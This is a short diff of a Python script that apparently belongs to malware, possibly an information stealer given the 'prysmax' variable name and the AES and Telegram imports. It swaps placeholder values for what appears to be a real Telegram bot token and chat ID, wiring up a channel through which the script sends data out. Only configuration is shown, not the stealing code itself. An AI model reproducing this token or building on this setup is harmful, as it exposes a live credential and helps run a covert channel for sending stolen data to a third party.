@@ -11,8 +11,8 @@ from Crypto.Cipher import AES
 from datetime import datetime
 from telegram import Bot
 
-prysmax = "token-here"
-chat_id = "chat-id"
+prysmax = "6941511642:AAHL9MmlNGSbMpv1dSHXrp_luPCd-5gKwj4"
+chat_id = "-1001935430453"
 
 bot = Bot(token=prysmax)
 
